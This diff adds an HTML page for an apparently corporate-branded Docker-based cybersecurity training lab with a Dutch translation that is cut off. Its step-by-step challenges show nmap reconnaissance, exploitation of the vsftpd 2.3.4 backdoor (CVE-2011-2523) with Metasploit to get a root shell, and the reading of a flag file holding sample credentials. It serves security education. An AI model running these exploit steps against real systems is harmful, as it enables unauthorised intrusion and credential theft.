@@ -1,0 +1,1327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🔐 ING Factory Cybersecurity Lab</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Monaco', 'Consolas', monospace;
+      background: #000;
+      color: #00ff00;
+      line-height: 1.6;
+      min-height: 100vh;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    hr {
+      border: 1px solid green
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+      padding: 30px;
+      background: rgba(0, 0, 0, 0.9);
+      border: 2px solid #ff6600;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(255, 102, 0, 0.4), inset 0 0 20px rgba(0, 255, 0, 0.1);
+      position: relative;
+      overflow: hidden;
+      backdrop-filter: blur(10px);
+    }
+
+    .ing-factory-badge {
+      display: inline-block;
+      background: linear-gradient(45deg, #ff6600, #ff9933);
+      color: white;
+      padding: 10px 20px;
+      border-radius: 25px;
+      font-weight: bold;
+      margin-bottom: 15px;
+      box-shadow: 0 4px 15px rgba(255, 102, 0, 0.3);
+      position: relative;
+      z-index: 2;
+    }
+
+    .ing-factory-badge::before {
+      content: "🏭";
+      margin-right: 8px;
+    }
+
+    .header h1 {
+      font-size: 2.5em;
+      margin-bottom: 10px;
+      text-shadow: 0 0 10px #ff6600;
+      color: #ff6600;
+      position: relative;
+      z-index: 2;
+    }
+
+    .subtitle {
+      color: #ff9933;
+      font-size: 1.2em;
+      position: relative;
+      z-index: 2;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 10px;
+      background: #333;
+      border-radius: 5px;
+      overflow: hidden;
+      margin: 20px 0;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #ff6600, #ff9933, #00ff00);
+      width: 0%;
+      transition: width 0.5s ease;
+    }
+
+    .score {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: rgba(0, 0, 0, 0.9);
+      padding: 15px;
+      border-radius: 10px;
+      border: 1px solid #ff6600;
+      box-shadow: 0 0 10px rgba(255, 102, 0, 0.3), 0 0 20px rgba(0, 255, 0, 0.1);
+      backdrop-filter: blur(10px);
+      z-index: 1000;
+    }
+
+    .language-toggle {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      background: rgba(0, 0, 0, 0.9);
+      padding: 10px;
+      border-radius: 10px;
+      border: 1px solid #ff6600;
+      box-shadow: 0 0 10px rgba(255, 102, 0, 0.3);
+      backdrop-filter: blur(10px);
+      z-index: 1000;
+    }
+
+    .language-toggle button {
+      background: linear-gradient(45deg, #ff6600, #ff9933);
+      color: white;
+      border: none;
+      padding: 8px 12px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-family: inherit;
+      margin: 2px;
+      transition: all 0.3s ease;
+      font-size: 12px;
+    }
+
+    .language-toggle button:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+    }
+
+    .language-toggle button.active {
+      background: linear-gradient(45deg, #4CAF50, #45a049);
+    }
+
+    .challenge-card {
+      background: rgba(0, 0, 0, 0.85);
+      border: 1px solid #333;
+      border-radius: 10px;
+      margin: 20px 0;
+      padding: 25px;
+      transition: all 0.3s ease;
+      position: relative;
+      backdrop-filter: blur(5px);
+    }
+
+    .challenge-card:hover {
+      border-color: #ff6600;
+      box-shadow: 0 0 15px rgba(255, 102, 0, 0.3), 0 0 30px rgba(0, 255, 0, 0.1);
+    }
+
+    .challenge-title {
+      color: #ff6600;
+      font-size: 1.5em;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .difficulty {
+      background: #ff6b6b;
+      color: #000;
+      padding: 3px 8px;
+      border-radius: 15px;
+      font-size: 0.7em;
+      font-weight: bold;
+    }
+
+    .difficulty.beginner { background: #4CAF50; }
+    .difficulty.intermediate { background: #FF9800; }
+    .difficulty.advanced { background: #f44336; }
+
+    .challenge-description {
+      color: #cccccc;
+      margin-bottom: 20px;
+      padding: 15px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 5px;
+      border-left: 4px solid #00cccc;
+    }
+
+    .lab-setup {
+      background: rgba(255, 102, 0, 0.1);
+      border: 2px solid #ff6600;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+
+    .hint-section {
+      margin: 15px 0;
+    }
+
+    .hint-button {
+      background: linear-gradient(45deg, #4CAF50, #45a049);
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-family: inherit;
+      margin: 5px;
+      transition: all 0.3s ease;
+      font-size: 14px;
+    }
+
+    .hint-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+    }
+    
+    .hint-button:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+    }
+
+    .hint-button.setup { background: linear-gradient(45deg, #9C27B0, #7B1FA2); }
+    .hint-button.explain { background: linear-gradient(45deg, #2196F3, #1976D2); }
+    .hint-button.command { background: linear-gradient(45deg, #FF9800, #F57C00); }
+    .hint-button.answer { background: linear-gradient(45deg, #ff6b6b, #e55555); }
+    .hint-button.ING { background: linear-gradient(45deg, #ff6600, #ff9933); }
+
+    .hint-content {
+      background: rgba(0, 150, 0, 0.1);
+      border: 1px solid #00aa00;
+      border-radius: 5px;
+      padding: 20px;
+      margin: 10px 0;
+      display: none;
+      animation: fadeIn 0.5s ease-in;
+    }
+
+    .answer-content {
+      background: rgba(150, 0, 0, 0.1);
+      border: 1px solid #aa0000;
+      border-radius: 5px;
+      padding: 20px;
+      margin: 10px 0;
+      display: none;
+      animation: fadeIn 0.5s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .code-wrapper {
+        position: relative;
+    }
+
+    .copy-code-button {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        background-color: #333;
+        color: #fff;
+        border: 1px solid #555;
+        padding: 5px 10px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 12px;
+        opacity: 0.7;
+        transition: opacity 0.3s;
+    }
+
+    .copy-code-button:hover {
+        opacity: 1;
+    }
+    
+    .copy-code-button:after {
+        content: attr(data-copied-text);
+        position: absolute;
+        top: -25px;
+        right: 0;
+        background-color: #4CAF50;
+        color: white;
+        padding: 3px 7px;
+        border-radius: 3px;
+        font-size: 12px;
+        white-space: nowrap;
+        opacity: 0;
+        transition: opacity 0.3s;
+        pointer-events: none;
+    }
+
+    .copy-code-button.copied:after {
+        opacity: 1;
+    }
+
+
+    .command-line {
+      background: #000;
+      color: #00ff00;
+      padding: 15px;
+      border-radius: 5px;
+      font-family: 'Courier New', monospace;
+      margin: 10px 0;
+      border-left: 4px solid #00ff00;
+      position: relative;
+    }
+
+    .command-line::before {
+      content: '$ ';
+      color: #00cccc;
+      font-weight: bold;
+    }
+
+    .terminal-output {
+      background: #000;
+      color: #00ff00;
+      padding: 15px;
+      border-radius: 5px;
+      font-family: 'Courier New', monospace;
+      white-space: pre-wrap;
+      margin: 10px 0;
+      border: 1px solid #333;
+      position: relative;
+    }
+
+    .important-note {
+      background: rgba(255, 102, 0, 0.1);
+      border: 2px solid #ff6600;
+      border-radius: 5px;
+      padding: 15px;
+      margin: 15px 0;
+      color: #ff9933;
+    }
+
+    .security-tip {
+      background: rgba(0, 255, 255, 0.1);
+      border: 2px solid #00cccc;
+      border-radius: 5px;
+      padding: 15px;
+      margin: 15px 0;
+      color: #00cccc;
+    }
+
+    .step-by-step {
+      counter-reset: step-counter;
+    }
+
+    .step {
+      counter-increment: step-counter;
+      margin: 15px 0;
+      padding: 15px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 5px;
+      border-left: 4px solid #ff6600;
+    }
+
+    .step::before {
+      content: "Step " counter(step-counter) ": ";
+      font-weight: bold;
+      color: #ff6600;
+    }
+
+    .completed {
+      opacity: 0.7;
+      border-color: #4CAF50 !important;
+    }
+
+    .completed .challenge-title::after {
+      content: ' ✅';
+      color: #4CAF50;
+    }
+
+    .docker-diagram {
+      text-align: center;
+      margin: 20px 0;
+      padding: 20px;
+      background: rgba(255, 102, 0, 0.1);
+      border-radius: 10px;
+      border: 1px solid #ff6600;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="language-toggle">
+        <button onclick="setLanguage('en')" id="btn-en" class="active">🇬🇧 EN</button>
+        <button onclick="setLanguage('nl')" id="btn-nl">🇳🇱 NL</button>
+      </div>
+      <div class="header-content">
+        <div class="ing-factory-badge" data-key="header.badge">ING Factory • ideas worth building</div>
+        <h1 data-key="header.title">🔐 Cybersecurity Awareness Lab</h1>
+        <p class="subtitle" data-key="header.subtitle">"Building Security Knowledge Through Safe, Hands-On Learning"</p>
+        <div class="progress-bar">
+          <div class="progress-fill" id="progressBar"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="score">
+      <div><span data-key="score.progress">Progress</span>: <span id="score">0</span>/75</div>
+      <div><span data-key="score.steps">Steps</span>: <span id="completed">0</span>/3</div>
+    </div>
+
+    <div class="important-note" data-key-html="welcome">
+    </div>
+
+    <div class="challenge-card" id="challenge0">
+      <div class="challenge-title">
+        <span data-key="challenge0.title"></span>
+        <span class="difficulty beginner" data-key="challenge0.difficulty"></span>
+      </div>
+      
+      <div class="challenge-description" data-key-html="challenge0.description">
+      </div>
+
+      <div class="hint-section">
+        <button class="hint-button explain" onclick="toggleHint('hint0-5', this)" data-color="#2196F3" data-key="challenge0.hints.kaliLinux"></button>
+        <button class="hint-button setup" onclick="toggleHint('hint0-1', this)" data-color="#9C27B0" data-key="challenge0.hints.docker"></button>
+        <button class="hint-button ING" onclick="toggleHint('hint0-4', this)" data-color="#ff6600" data-key="challenge0.hints.ing"></button>
+        <button class="hint-button explain" onclick="toggleHint('hint0-2', this)" data-color="#2196F3" data-key="challenge0.hints.connect"></button>
+        <button class="hint-button command" onclick="toggleHint('hint0-3', this)" data-color="#FF9800" data-key="challenge0.hints.command"></button>
+        <button class="hint-button answer" onclick="toggleAnswer('answer0', this)" data-color="#ff6b6b" data-key="challenge0.hints.solution"></button>
+      </div>
+      
+      <div class="hint-content" id="hint0-5" data-key-html="challenge0.hints.kaliLinuxContent"></div>
+      <div class="hint-content" id="hint0-1" data-key-html="challenge0.hints.dockerContent"></div>
+      <div class="hint-content" id="hint0-2" data-key-html="challenge0.hints.connectContent"></div>
+      <div class="hint-content" id="hint0-3" data-key-html="challenge0.hints.commandContent"></div>
+      <div class="hint-content" id="hint0-4" data-key-html="challenge0.hints.ingContent"></div>
+      <div class="answer-content" id="answer0" data-key-html="challenge0.solutionContent"></div>
+
+       <div class="lab-setup">
+        <h3><span data-key="challenge0.setupTitle"></span></h3>
+        <div class="docker-diagram" data-key-html="challenge0.diagramContent">
+        </div>
+      </div>
+
+    </div>
+
+    <div class="challenge-card" id="challenge1">
+      <div class="challenge-title">
+        <span data-key="challenge1.title"></span>
+        <span class="difficulty beginner" data-key="challenge1.difficulty"></span>
+      </div>
+      
+      <div class="challenge-description" data-key-html="challenge1.description">
+      </div>
+
+      <div class="hint-section">
+        <button class="hint-button explain" onclick="toggleHint('hint1-1', this)" data-color="#2196F3" data-key="challenge1.hints.scanning"></button>
+        <button class="hint-button setup" onclick="toggleHint('hint1-2', this)" data-color="#9C27B0" data-key="challenge1.hints.tool"></button>
+        <button class="hint-button command" onclick="toggleHint('hint1-3', this)" data-color="#FF9800" data-key="challenge1.hints.command"></button>
+        <button class="hint-button answer" onclick="toggleAnswer('answer1', this)" data-color="#ff6b6b" data-key="challenge1.hints.solution"></button>
+      </div>
+
+      <div class="hint-content" id="hint1-1" data-key-html="challenge1.hints.scanningContent"></div>
+      <div class="hint-content" id="hint1-2" data-key-html="challenge1.hints.toolContent"></div>
+      <div class="hint-content" id="hint1-3" data-key-html="challenge1.hints.commandContent"></div>
+      <div class="answer-content" id="answer1" data-key-html="challenge1.solutionContent"></div>
+    </div>
+
+    <div class="challenge-card" id="challenge2">
+      <div class="challenge-title">
+        <span data-key="challenge2.title"></span>
+        <span class="difficulty intermediate" data-key="challenge2.difficulty"></span>
+      </div>
+      
+      <div class="challenge-description" data-key-html="challenge2.description">
+      </div>
+
+      <div class="hint-section">
+        <button class="hint-button explain" onclick="toggleHint('hint2-1', this)" data-color="#2196F3" data-key="challenge2.hints.backdoor"></button>
+        <button class="hint-button setup" onclick="toggleHint('hint2-2', this)" data-color="#9C27B0" data-key="challenge2.hints.metasploit"></button>
+        <button class="hint-button command" onclick="toggleHint('hint2-3', this)" data-color="#FF9800" data-key="challenge2.hints.exploit"></button>
+        <button class="hint-button answer" onclick="toggleAnswer('answer2', this)" data-color="#ff6b6b" data-key="challenge2.hints.solution"></button>
+        <button class="hint-button ING" onclick="toggleHint('hint2-4', this)" data-color="#ff6600" data-key="challenge2.hints.flag"></button>
+      </div>
+
+      <div class="hint-content" id="hint2-1" data-key-html="challenge2.hints.backdoorContent"></div>
+      <div class="hint-content" id="hint2-2" data-key-html="challenge2.hints.metasploitContent"></div>
+      <div class="hint-content" id="hint2-3" data-key-html="challenge2.hints.exploitContent"></div>
+      <div class="hint-content" id="hint2-4" data-key-html="challenge2.hints.flagContent"></div>
+      <div class="answer-content" id="answer2" data-key-html="challenge2.solutionContent"></div>
+    </div>
+
+    <div class="challenge-card" id="completion" style="display: none;">
+      <div class="challenge-title" data-key="completion.title">
+      </div>
+      <div class="challenge-description" data-key-html="completion.content">
+      </div>
+    </div>
+  </div>
+
+<script>
+    // --- State Management ---
+    let totalScore = 0;
+    let completedChallengesCount = 0;
+    const totalChallenges = 3;
+    const challengeCompletionStatus = [false, false, false];
+    let currentLanguage = 'en';
+
+    // --- Translations Object ---
+    const translations = {
+      en: {
+        header: {
+          badge: "ING Factory • ideas worth building",
+          title: "🔐 Cybersecurity Awareness Lab",
+          subtitle: "Building Security Knowledge Through Safe, Hands-On Learning"
+        },
+        score: { progress: "Progress", steps: "Steps" },
+        welcome: "🎯 <strong>Welcome!</strong> This lab teaches cybersecurity awareness through controlled, educational exercises. No prior technical experience needed - we'll guide you step by step!",
+        challenge0: {
+          title: "🚀 Step 0: Connecting to Your Lab Environment",
+          difficulty: "START HERE",
+          description: "<strong>What you're doing:</strong> Before we can start learning about security, we need to connect to our practice environment. Think of this like logging into a computer that's specially set up for safe learning. We have set up two Containers using Docker on your machine for you to play with.<br><br><strong>Always login to your Kali Linux container to do the excersises.</strong>",
+          setupTitle: "🖥️ Your Lab Setup",
+          diagramContent: `<div>🖥️ <strong>Kali Linux</strong> (<span>Your Attack Machine</span>) $kali_ip </div>
+          <div>↕️</div>
+          <div>🎯 <strong>Vulnerable Target</strong> (<span>Practice Machine</span>) $badweb_ip</div>`,
+          hints: {
+            kaliLinux: "🤔 What is Kali Linux?",
+            docker: "🔧 What is Docker?",
+            ing: "🔧 How is Docker used in ING?",
+            connect: "📚 How to Connect", 
+            command: "💻 Connection Command",
+            solution: "🚨 Complete Solution",
+            kaliLinuxContent: `<h4>🤔 What is Kali Linux?</h4>
+                              <p><strong>Kali Linux is a special version of the Linux operating system designed for cybersecurity professionals and enthusiasts.</strong> Think of it as a digital toolbox packed with hundreds of pre-installed tools for penetration testing, security research, computer forensics, and reverse engineering.</p>
+                              <div class="security-tip">
+                                <strong>Key Features:</strong>
+                                <ul>
+                                  <li><strong>Pre-installed Tools:</strong> Comes with over 600 penetration testing tools like Nmap, Wireshark, Metasploit, and Aircrack-ng.</li>
+                                  <li><strong>Secure Environment:</strong> Built on a solid foundation, it's a reliable platform for security tasks.</li>
+                                  <li><strong>Customizable:</strong> Highly flexible, allowing users to tailor it to their specific needs.</li>
+                                  <li><strong>Industry Standard:</strong> Widely recognized and used by security professionals worldwide.</li>
+                                </ul>
+                              </div>
+                              <p>In this lab, you are using Kali Linux as your "attack machine" to learn how these powerful tools are used in a safe, controlled environment.</p>`,
+            dockerContent: `<h4>🐳 Understanding Docker</h4>
+                            <p><strong>What is Docker?</strong> Think of Docker like having multiple computers inside your computer. 
+                            Each "container" is like a separate, isolated computer that can't affect your real computer.</p>`,
+            connectContent: `<h4>🔌 How to Connect to Your Lab</h4>
+                            <div class="step-by-step">
+                              <div class="step">
+                                <strong>Open your terminal/command prompt</strong>
+                                <ul>
+                                  <li><strong>Windows:</strong> Press Win+R, type "cmd", press Enter</li>
+                                  <li><strong>Mac:</strong> Press Cmd+Space, type "terminal", press Enter</li>
+                                  <li><strong>Linux:</strong> Press Ctrl+Alt+T</li>
+                                </ul>
+                              </div>
+                            </div>`,
+            commandContent: `<h4>💻 The Connection Command</h4>
+                            <p><strong>Type this exact command in your terminal:</strong></p>
+                            <div class="code-wrapper">
+                                <div class="command-line">docker exec -it kali bash</div>
+                                <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                            </div>`,
+            ingContent: `<h4>🏭 How does ING use Docker?</h4>
+                        <p><strong>Docker is used in the ICHP Environment</strong></p>
+                        <p>This is the mechanism that controls many of ING's services and offerings to our valued customers and allows us to be agile in our service offerings while offering world class security.</p>
+                        <br>
+                        <div class="security-tip">
+                          <strong>🏦 ING's Container Strategy:</strong>
+                          <ul>
+                            <li>🔄 <strong>Microservices:</strong> Breaking applications into smaller, manageable pieces</li>
+                            <li>🚀 <strong>Rapid Deployment:</strong> Quick updates and rollbacks for better customer experience</li>
+                            <li>🛡️ <strong>Isolation:</strong> Each service runs independently for enhanced security</li>
+                            <li>📈 <strong>Scalability:</strong> Handle varying customer loads efficiently</li>
+                          </ul>
+                        </div>`,
+          },
+          solutionContent: `<div class="step-by-step">
+                            <div class="step">
+                              <strong>Open your terminal</strong>
+                            </div>
+                            <div class="step">
+                              <strong>Connect to Kali Linux</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">docker exec -it kali bash</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Verify you're connected</strong>
+                              <div class="code-wrapper">
+                                  <div class="terminal-output">root@kali:~# </div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                            </div>
+                          </div>
+                          <button class="hint-button" onclick="completeChallenge(0, 20)" data-key="challenge0.complete">✅ I'm Connected!</button>`,
+          complete: "✅ I'm Connected!"
+        },
+        challenge1: {
+          title: "🔍 Step 1: Discovering What's on the Network",
+          difficulty: "BEGINNER",
+          description: "<strong>What you're learning:</strong> How attackers discover what computers and services are available on a network.<br><br><strong>Your mission:</strong> Find out what services are running on the target machine and identify any security vulnerabilities.",
+          hints: {
+            scanning: "🤔 What is Network Scanning?",
+            tool: "🛠️ The Right Tool",
+            command: "📋 Understanding the Command",
+            solution: "🚨 Complete Solution",
+            scanningContent: `<h4>🌐 Understanding Network Scanning</h4>
+                              <p><strong>What is network scanning?</strong> Imagine you're in a hotel hallway. Network scanning is like looking at each door to see which rooms exist and which have people in them.</p>`,
+            toolContent: `<h4>🔧 Meet Nmap</h4>
+                          <p><strong>Nmap:</strong> The "Network Mapper" - the most famous network scanning tool in the world! Our first step is to find which machines are active on the network. We can do this with a simple "ping scan".</p>
+                          <div class="code-wrapper">
+                              <div class="command-line">nmap -sn 172.19.0.0/24</div>
+                              <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                          </div>
+                          <p>This command sends a ping to every possible address in the range and lists the ones that respond.</p>
+                          <div class="code-wrapper">
+                              <div class="terminal-output">Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-27 10:30 UTC
+      Nmap scan report for kali.demo (172.19.0.2)
+      Host is up (0.000010s latency).
+      Nmap scan report for badweb.demo (172.19.0.3)
+      Host is up (0.000020s latency).
+      Nmap done: 256 IP addresses (2 hosts up) scanned in 2.50 seconds</div>
+                              <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                          </div>
+                          <p>The scan found two machines. One is our own machine (kali), and the other is our target ($badweb_ip). Now that we have the target's IP, we can perform a more detailed scan to find open services.</p>`,
+            commandContent: `<h4>📚 The Complete Command</h4>
+                            <div class="code-wrapper">
+                                <div class="command-line">nmap -sV -p 1-100 --script vulners $badweb_ip</div>
+                                <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                            </div>
+                            <p>This scans ports 1-100 on our specific target, identifies the services running (<code>-sV</code>), and checks for known vulnerabilities using the \`vulners\` script.</p>`,
+          },
+          solutionContent: `<div class="step-by-step">
+                            <div class="step">
+                              <strong>Connect to Kali Linux</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">docker exec -it kali bash</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Discover active machines on the network</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">nmap -sn 172.19.0.0/24</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                              <div class="code-wrapper">
+                                  <div class="terminal-output">...
+      Nmap scan report for badweb.demo (172.19.0.3)
+      Host is up...
+      ...</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Run a detailed scan on the target</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">nmap -sV -p 1-100 --script vulners $badweb_ip</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Results show the vsftpd vulnerability</strong>
+                              <div class="code-wrapper">
+                                  <div class="terminal-output">Nmap scan report for badweb.demo (172.19.0.3)
+      Host is up (0.0000050s latency).
+      Not shown: 98 closed tcp ports (reset)
+      PORT   STATE SERVICE VERSION
+      21/tcp open  ftp     vsftpd 2.3.4
+      | vulners:
+      |   vsftpd 2.3.4:
+      |       CVE-2011-2523 10.0 https://vulners.com/cve/CVE-2011-2523
+      80/tcp open  http    lighttpd 1.4.59
+      |_http-server-header: lighttpd/1.4.59
+
+      Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                            </div>
+                          </div>
+                          <button class="hint-button" onclick="completeChallenge(1, 25)" data-key="challenge1.complete">✅ I Found the Vulnerability!</button>`,
+          complete: "✅ I Found the Vulnerability!"
+        },
+        challenge2: {
+          title: "💥 Step 2: Exploiting the Vulnerability", 
+          difficulty: "INTERMEDIATE",
+          description: "<strong>What you're learning:</strong> How to exploit the backdoor vulnerability you found.<br><br><strong>Your mission:</strong> Use Metasploit to exploit CVE-2011-2523 and gain control of the target.<br><br>On the server $badweb_hostname there is the <strong>bank account credentials</strong> used for login, see if you can <strong>find</strong> them. Maybe a user has them?",
+          hints: {
+            backdoor: "🎭 What is a Backdoor?",
+            metasploit: "🛠️ Meet Metasploit",
+            exploit: "🔍 Finding the Exploit",
+            solution: "🚨 Complete Solution",
+            flag: "🚩 Get The Flag",
+            backdoorContent: `<h4>🎭 Understanding Backdoors</h4>
+                              <p>CVE-2011-2523 is a backdoor in vsftpd 2.3.4. When you send a username ending with ":)", it opens a secret shell on port 6200.</p>`,
+            metasploitContent: `<h4>🚀 Metasploit Framework</h4>
+                                <p>Metasploit is like a "Swiss Army knife" for cybersecurity testing with thousands of known exploits.</p>`,
+            exploitContent: `<h4>🔍 Finding the Right Exploit</h4>
+                            <p>Start Metasploit, search for vsftpd, and use the backdoor exploit:</p>
+                            <div class="code-wrapper">
+                                <div class="command-line">msfconsole</div>
+                                <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                            </div>
+                            <div class="code-wrapper">
+                                <div class="command-line">search vsftpd</div>
+                                <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                            </div>`,
+            flagContent: `<h4>🚩 Getting the Flag</h4>
+                          <p>Once you have a root shell, you need to navigate the file system to find sensitive information. User home directories are a good place to start looking for files.</p>
+                          
+                          <div class="step-by-step">
+                              <div class="step">
+                                  <strong>Navigate to a user's home directory.</strong>
+                                  <p>The <code>cd</code> command (Change Directory) allows you to move between folders. Let's check a user's 'Documents' folder.</p>
+                                  <div class="code-wrapper">
+                                      <div class="command-line">cd /home/socrates/Documents</div>
+                                      <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                                  </div>
+                              </div>
+                              <div class="step">
+                                  <strong>List the files in the directory.</strong>
+                                  <p>Use the <code>ls</code> command to see what's inside.</p>
+                                  <div class="code-wrapper">
+                                      <div class="command-line">ls</div>
+                                      <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                                  </div>
+                                  <div class="code-wrapper">
+                                      <div class="terminal-output">
+                                          bank.txt
+                                          notes.txt
+                                      </div>
+                                      <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                                  </div>
+                              </div>
+                              <div class="step">
+                                  <strong>Display the file content.</strong>
+                                  <p>The <code>cat</code> command reads and displays the content of a file. Let's see what's in \`bank.txt\`.</p>
+                                  <div class="code-wrapper">
+                                      <div class="command-line">cat bank.txt</div>
+                                      <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                                  </div>
+                                  <div class="code-wrapper">
+                                      <div class="terminal-output">
+                                          FLAG{B4nk_D3t41l_F0und_GG}
+                                          Username: ing_user
+                                          Password: SecurePassword123!
+                                      </div>
+                                      <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                                  </div>
+                              </div>
+                          </div>
+                          <div class="security-tip">
+                              <strong>Hint:</strong> As an engineer, you know that not everything is as it seems. Some files hide in plain sight, starting with a dot. This one is special, it contains the <span style='color: #ff9933;'>cred</span> you're looking for, but the filename itself is a bit... unconventional. Think about what characters are valid in filenames, but not often used.
+                               <div class="code-wrapper">
+                                  <div class="command-line">ls -la</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                          </div>`,
+          },
+          solutionContent: `<div class="step-by-step">
+                            <div class="step">
+                              <strong>Connect to Kali Linux</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">docker exec -it kali bash</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Start Metasploit</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">msfconsole</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Find the exploit</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">search vsftpd</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                              <div class="code-wrapper">
+                                  <div class="command-line">use exploit/unix/ftp/vsftpd_234_backdoor</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Configure and attack</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">set RHOSTS $badweb_ip</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                              <div class="code-wrapper">
+                                  <div class="command-line">exploit</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>You now have root access!</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">whoami</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                              <div class="code-wrapper">
+                                  <div class="terminal-output">root</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Copied!">Copy</button>
+                              </div>
+                            </div>
+                          </div>
+                          <button class="hint-button" onclick="completeChallenge(2, 30)" data-key="challenge2.complete">✅ I Owned the System!</button>`,
+          complete: "✅ I Owned the System!"
+        },
+        completion: {
+          title: "🏆 ING Factory Security Training Complete!",
+          content: `<div class="ing-factory-badge" data-key="completion.badge">Congratulations - You've Built Security Knowledge!</div>
+                    <br>
+                    <strong data-key="completion.learned">🎓 What you've learned:</strong>
+                    <ul data-key-list="completion.points">
+                    </ul>
+                    <br>
+                    <strong data-key="completion.apply">🏭 Apply this in your daily work:</strong>
+                    <ul data-key-list="completion.tips">
+                    </ul>`,
+          badge: "Congratulations - You've Built Security Knowledge!",
+          learned: "🎓 What you've learned:",
+          points: [
+            "🔍 Network reconnaissance and vulnerability discovery",
+            "💥 How security flaws are exploited by attackers", 
+            "🛡️ How to think like both attacker and defender"
+          ],
+          apply: "🏭 Apply this in your daily work:",
+          tips: [
+            "✅ Use unique, strong passwords with a password manager",
+            "✅ Keep software updated to patch vulnerabilities",
+            "✅ Use WPA3 WiFi encryption with complex passwords",
+            "✅ Avoid public WiFi for sensitive activities", 
+            "✅ Be suspicious of unexpected emails and links",
+            "✅ Report security concerns to your IT team"
+          ]
+        }
+      },
+      nl: {
+        header: {
